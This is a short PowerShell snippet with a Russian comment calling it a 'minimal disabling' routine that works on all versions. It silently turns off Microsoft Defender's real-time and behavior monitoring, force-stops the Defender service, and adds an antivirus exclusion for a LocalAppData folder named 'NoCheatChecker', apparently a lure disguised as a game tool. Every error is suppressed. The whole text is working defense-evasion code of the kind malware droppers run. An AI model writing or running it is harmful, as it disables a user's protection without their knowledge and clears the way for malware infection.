# Минимальное отключение (работает на всех версиях)
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\NoCheatChecker" -ErrorAction SilentlyContinue
} catch {}
